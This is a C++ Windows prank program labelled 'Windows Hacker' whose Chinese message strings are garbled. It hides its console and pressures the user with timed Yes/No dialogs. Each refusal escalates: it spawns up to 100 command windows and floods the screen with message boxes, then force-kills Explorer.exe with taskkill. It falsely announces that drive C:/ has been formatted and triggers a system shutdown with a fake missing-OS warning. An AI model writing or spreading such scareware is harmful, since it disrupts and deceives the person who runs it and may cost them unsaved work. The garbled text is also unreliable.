#include<cstdio>
#include<windows.h>
using namespace std;

int Res;

DWORD WINAPI First_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"��ĵ����Ѿ����������ˣ�\n˵�����ǲ�������!\n��ֻ�� 5 ��ʱ��ش�","Windows Hacker",4);
    
    return 0L;
}
DWORD WINAPI Second_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"�������ǰɣ�������һ�飬���ǲ�������!\n��ֻ�� 5 ��ʱ��ش�","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Third_Message(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"�������һ�Σ����ǲ�������!\n��ֻ�� 5 ��ʱ��ش�","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI First_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"���ش�\n���ǲ���������\n��˵�Ͱ����Զ�ѡ��","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Second_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"С��ţ����㣡\n���ǲ���������\n��˵�Ͱ����Զ�ѡ��","Windows Hacker",4);
    return 0L;
}
DWORD WINAPI Third_Warning(LPVOID lpParamter)
{
    Res=MessageBox(NULL,"�㻹��˵�ǰɣ�\n���ǲ���������\n��˵�Ͱ����Զ�ѡ��","Windows Hacker",4);
    return 0L;
}

int main()
{
	HWND hwnd; if(hwnd=::FindWindow("ConsoleWindowClass",NULL)) 
	{
		::ShowWindow(hwnd,SW_HIDE); 
	}
	
	HANDLE hThread_1 = CreateThread(NULL, 0, First_Message, NULL, 0, NULL);
	CloseHandle(hThread_1);
	Sleep(5000);
	
	Flag_1:
		if(Res==6)
		{
			Res=0;
			MessageBox(NULL,"�����ԶԶԡ�","Windows Hacker",0);
			for(int i=30;i>=1;i--)
				MessageBox(NULL,"���������","Windows Hacker",0);
			MessageBox(NULL,"����г��Ⱑ��","Windows Hacker",0);
			return 0;
		}
		else if(Res==0)
		{
			HANDLE hThread_W1 = CreateThread(NULL, 0, First_Warning, NULL, 0, NULL);
			CloseHandle(hThread_W1);
			Sleep(5000);
			if(Res==0) Res=7;
			goto Flag_1;
		}
		else
		{
			Res=0;
			for(int i=1;i<=30;i++) system("Start");
			Sleep(1000);
			HANDLE hThread_2 = CreateThread(NULL, 0, Second_Message, NULL, 0, NULL);
			CloseHandle(hThread_2);
			Sleep(5000);
			
			Flag_2:
				if(Res==6)
				{
					Res=0;
					MessageBox(NULL,"�����ԶԶԡ�","Windows Hacker",0);
					for(int i=50;i>=1;i--)
						MessageBox(NULL,"���������","Windows Hacker",0);
					MessageBox(NULL,"����г��Ⱑ��","Windows Hacker",0);
					return 0;
				}
				else if(Res==0)
				{
					HANDLE hThread_W2 = CreateThread(NULL, 0, Second_Warning, NULL, 0, NULL);
					CloseHandle(hThread_W2);
					Sleep(5000);
					if(Res==0) Res=7;
					goto Flag_2;
				}
				else
				{
					Res=0;
					for(int i=1;i<=100;i++) system("Start");
					Sleep(3000); 
					HANDLE hThread_3 = CreateThread(NULL, 0, Third_Message, NULL, 0, NULL);
					CloseHandle(hThread_3);
					Sleep(5000);
					
					Flag_3:
						if(Res==6)
						{
							MessageBox(NULL,"�����ԶԶԡ�","Windows Hacker",0);
							for(int i=100;i>=1;i--)
								MessageBox(NULL,"���������","Windows Hacker",0);
							MessageBox(NULL,"����г��Ⱑ��","Windows Hacker",0);
							return 0;
						}
						else if(Res==0)
						{
							HANDLE hThread_W3 = CreateThread(NULL, 0, Third_Warning, NULL, 0, NULL);
							CloseHandle(hThread_W3);
							Sleep(5000);
							if(Res==0) Res=7;
							goto Flag_3;
						}
						else
						{
							MessageBox(NULL,"�����ˣ������û�����㡣","Windows Hacker",0);
							Sleep(6000);
							system("taskkill /im Explorer.exe /f");
							Sleep(2000);
							MessageBox(NULL,"��ʽ�������� C:/ �ɹ�","Windows Hacker",0);
							system("Shutdown -s -t 10 -c �������Ĳ���ϵͳȱʧ�����Խ��Զ��ػ�\n��������ϵ�����豸�����̻�΢��ٷ���");
							return 0;
						}
				}
		}
		
		return 0;
}
